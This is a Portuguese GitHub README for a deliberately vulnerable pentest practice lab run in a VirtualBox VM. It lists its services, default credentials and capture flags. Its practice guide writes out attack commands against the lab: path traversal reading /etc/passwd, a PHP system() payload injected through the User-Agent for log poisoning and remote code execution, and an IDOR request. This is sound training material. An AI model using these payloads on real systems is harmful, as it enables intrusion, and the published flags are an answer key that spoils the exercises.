<div align="center">

```
  ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗      █████╗ ██████╗
  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║     ██╔══██╗██╔══██╗
  ███████╗███████║███████║██║  ██║██║   ██║██║     ███████║██████╔╝
  ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║     ██╔══██║██╔══██╗
  ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝███████╗██║  ██║██████╔╝
  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝╚═════╝
```

### `// Vulnerable Practice Environment — Shadow Suite`

**VirtualBox · Ubuntu · SSH · Termux · 3 Níveis · 3 Vetores**

[![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)](.)
[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](.)
[![Ubuntu](https://img.shields.io/badge/Ubuntu-20.04+-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)](.)
[![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=for-the-badge&logo=virtualbox&logoColor=white)](.)
[![License](https://img.shields.io/badge/license-MIT-f0c94d?style=for-the-badge)](.)
[![Shadow Suite](https://img.shields.io/badge/Shadow-Suite-e05260?style=for-the-badge)](https://github.com/mrjoker-web)

</div>

---

## `> about`

**Shadow Lab** é um ambiente de prática de pentest totalmente isolado — instalado numa VM Ubuntu no VirtualBox com um único script.

Contém serviços deliberadamente vulneráveis organizados em 3 níveis de dificuldade e 3 vetores de ataque, pensado para praticar as tools da **Shadow Suite** e técnicas reais de pentest.

Acessível via browser, terminal local **ou pelo telemóvel via Termux + SSH**.

---

## `> architecture`

```
┌─────────────────────────────────────────────────────┐
│                  VirtualBox VM                      │
│               Ubuntu 20.04+                         │
│                                                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │  DVWA    │  │  FTP     │  │  SSH (seguro)    │  │
│  │ :8010    │  │  :8021   │  │  :22             │  │
│  └──────────┘  └──────────┘  └──────────────────┘  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │  Redis   │  │  Vuln    │  │  LFI→RCE         │  │
│  │ :8379    │  │  API     │  │  :8051           │  │
│  └──────────┘  │  :8050   │  └──────────────────┘  │
│                └──────────┘                         │
│  ┌─────────────────────────────────────────────┐   │
│  │         Shadow Lab Dashboard :8079          │   │
│  └─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
         ▲                        ▲
         │                        │
   PC (browser               Telemóvel
   ou terminal)           Termux + SSH
```

---

## `> machines`

### 🟢 Nível 1 — Iniciante

| ID | Nome | Porta | Vulns |
|----|------|-------|-------|
| web-01 | DVWA | 8010 | SQLi, XSS, CSRF, File Upload, Brute Force |
| net-01 | FTP Vulnerável | 8021 | Anonymous FTP, Weak Creds, Banner Disclosure |
| net-02 | SSH Weak Creds | 8022 | Weak Credentials, Banner Grabbing |

### 🟡 Nível 2 — Intermédio

| ID | Nome | Porta | Vulns |
|----|------|-------|-------|
| net-03 | Redis No Auth | 8379 | Unauthenticated Redis, Data Exposure, RCE |
| web-02 | Vulnerable API | 8050 | IDOR, SQLi, Mass Assignment, JWT Attacks |

### 🔴 Nível 3 — Avançado

| ID | Nome | Porta | Vulns |
|----|------|-------|-------|
| web-03 | LFI → RCE Chain | 8051 | LFI, Log Poisoning, Path Traversal, RCE |

---

## `> requirements`

**No PC:**
- VirtualBox 6.1+
- Ubuntu 20.04+ (VM com 2GB RAM, 20GB disco)
- Acesso à rede entre host e VM (modo Bridge ou Host-Only)

**No telemóvel:**
- Termux (Android)
- SSH client: `pkg install openssh`

---

## `> install`

### 1. Cria a VM no VirtualBox

```
Nome    : ShadowLab
SO      : Ubuntu 64-bit
RAM     : 2048 MB (mínimo)
Disco   : 20 GB
Rede    : Bridged Adapter (para aceder do telemóvel)
```

### 2. Instala Ubuntu na VM e corre o script

```bash
# Na VM Ubuntu, abre o terminal e corre:
git clone https://github.com/mrjoker-web/ShadowLab.git
cd ShadowLab
sudo bash install.sh
```

### 3. Anota o IP da VM

```bash
# No final da instalação o IP é mostrado automaticamente
# Ou corre:
hostname -I
```

---

## `> access`

### PC — Browser

```
Dashboard    →  http://<IP_DA_VM>:8079
DVWA         →  http://<IP_DA_VM>:8010
Vuln API     →  http://<IP_DA_VM>:8050
LFI Chain    →  http://<IP_DA_VM>:8051
```

### PC — Terminal

```bash
# SSH para a VM
ssh shadowlab@<IP_DA_VM>
# password: ShadowLab2024!

# Dentro da VM — listar alvos
python3 /opt/shadowlab/shadowlab.py targets

# Dicas para uma máquina
python3 /opt/shadowlab/shadowlab.py hints web-02
```

### 📱 Telemóvel (Termux)

```bash
# Instalar SSH no Termux (só na primeira vez)
pkg install openssh -y

# Conectar à VM
ssh shadowlab@<IP_DA_VM>
# password: ShadowLab2024!

# Correr Shadow Suite tools directamente
python3 ~/ShadowCLI/shadow.py -t <IP_DA_VM> --full-recon
python3 ~/ShadowScanner/shadowscanner.py <IP_DA_VM> --top-ports
```

---

## `> practice guide`

### 🟢 Por onde começar (Nível 1)

```bash
# 1. Scan inicial com Shadow Suite
python3 shadow.py -t <VM_IP> --scan --banner

# 2. Ataca o DVWA
# → Vai a http://<VM_IP>:8010
# → Login: admin / password
# → Define dificuldade para "Low"
# → Começa pelo SQL Injection

# 3. Enumera o FTP
python3 shadow.py -t <VM_IP> --banner
ftp <VM_IP> 8021  # tenta anonymous login
```

### 🟡 Nível 2

```bash
# Redis
redis-cli -h <VM_IP> -p 8379
> KEYS *
> GET flag

# API vulnerável
curl http://<VM_IP>:8050/api/docs
curl -X POST http://<VM_IP>:8050/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"mrjoker","password":"shadow123"}'

# Testa IDOR — acede ao user 1 (admin) com token de outro user
curl http://<VM_IP>:8050/api/users/1 \
  -H "Authorization: Bearer <TOKEN>"
```

### 🔴 Nível 3

```bash
# LFI — step by step
# Passo 1: descobre o parâmetro vulnerável
curl "http://<VM_IP>:8051/?page=home"

# Passo 2: path traversal
curl "http://<VM_IP>:8051/?page=....//....//etc/passwd"

# Passo 3: inclui o log do Apache
curl "http://<VM_IP>:8051/?page=/var/log/apache2/lfi_access.log"

# Passo 4: envenena o log com PHP via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" "http://<VM_IP>:8051/"

# Passo 5: RCE!
curl "http://<VM_IP>:8051/?page=/var/log/apache2/lfi_access.log&cmd=id"
```

---

## `> flags`

```
flag{ftp_anon_backup_found}       ← FTP anónimo
flag{redis_noauth_data_exposed}   ← Redis sem auth
flag{hidden_debug_endpoint_found} ← API endpoint escondido
flag{api_admin_access_granted}    ← API — acesso admin
flag{lfi_path_traversal_works}    ← LFI
flag{log_poison_rce}              ← LFI → RCE completo
```

---

## `> shadow suite integration`

O Shadow Lab foi desenhado para ser atacado com as tools da Shadow Suite:

```bash
# Full recon ao lab
python3 shadow.py -t <VM_IP> --full-recon -o lab_report

# Network scan profundo
python3 shadowscanner.py <VM_IP> --top-ports -o lab_network.json

# Directory fuzzing na API
python3 shadow.py -t <VM_IP>:8050 --fuzz
```

---

## `> roadmap`

```
✅ DVWA — SQLi, XSS, File Upload
✅ FTP anónimo + credenciais fracas
✅ SSH credenciais fracas
✅ Redis sem autenticação
✅ Vulnerable REST API (IDOR, SQLi, Mass Assignment)
✅ LFI → RCE chain
✅ Dashboard web com status em tempo real
✅ Acesso via Termux + SSH
🔄 WordPress vulnerável (CVEs reais)
🔄 Android APK vulnerável para ShadowDroid
🔄 Máquina de pivoting (rede interna)
🔄 Gerador de relatório automático
```

---

## `> shadow suite`

| Tool | Descrição | Repo |
|------|-----------|------|
| 🌐 ShadowSub | Subdomain finder | [mrjoker-web/ShadowSub](https://github.com/mrjoker-web/ShadowSub) |
| ⚡ ShadowProbe | HTTP/HTTPS probe | [mrjoker-web/ShadowProbe](https://github.com/mrjoker-web/ShadowProbe) |
| 🔍 ShadowScan | Recon tool | [mrjoker-web/ShadowScan-Tool](https://github.com/mrjoker-web/ShadowScan-Tool) |
| 🛡️ ShadowScanner | Network scanner | [mrjoker-web/ShadowScanner](https://github.com/mrjoker-web/ShadowScanner) |
| 📱 ShadowDroid | Android ADB audit | [mrjoker-web/ShadowDroid-](https://github.com/mrjoker-web/ShadowDroid-) |
| ⚙️ ShadowSetup | Terminal setup | [mrjoker-web/ShadowSetup](https://github.com/mrjoker-web/ShadowSetup) |
| 🖥️ Shadow CLI | Full recon framework | [mrjoker-web/ShadowCLI](https://github.com/mrjoker-web/ShadowCLI) |
| 🧪 Shadow Lab | Practice environment | **este repo** |

---

## `> disclaimer`

```
⚠  AVISO LEGAL

O Shadow Lab contém serviços DELIBERADAMENTE VULNERÁVEIS.

• Instala APENAS numa VM isolada do VirtualBox
• NUNCA expor à internet ou a redes públicas
• Uso exclusivo para fins educacionais e prática de pentest
• O autor não se responsabiliza por uso indevido
```

---

## `> author`

<div align="center">

Feito por **[Mr Joker](https://github.com/mrjoker-web)** — Aspiring Pentester & Python Tools Developer · Lisboa, PT

[![GitHub](https://img.shields.io/badge/GitHub-mrjoker--web-181717?style=for-the-badge&logo=github)](https://github.com/mrjoker-web)
[![Telegram](https://img.shields.io/badge/Telegram-mr__joker78-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/mr_joker78)
[![Twitter/X](https://img.shields.io/badge/X-mrjoker3790-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/mrjoker3790)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Mr%20Joker-0e76a8?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/mr-joker-951ab2357)

*Se achares útil, deixa uma ⭐ — ajuda a Shadow Suite a crescer!*

</div>
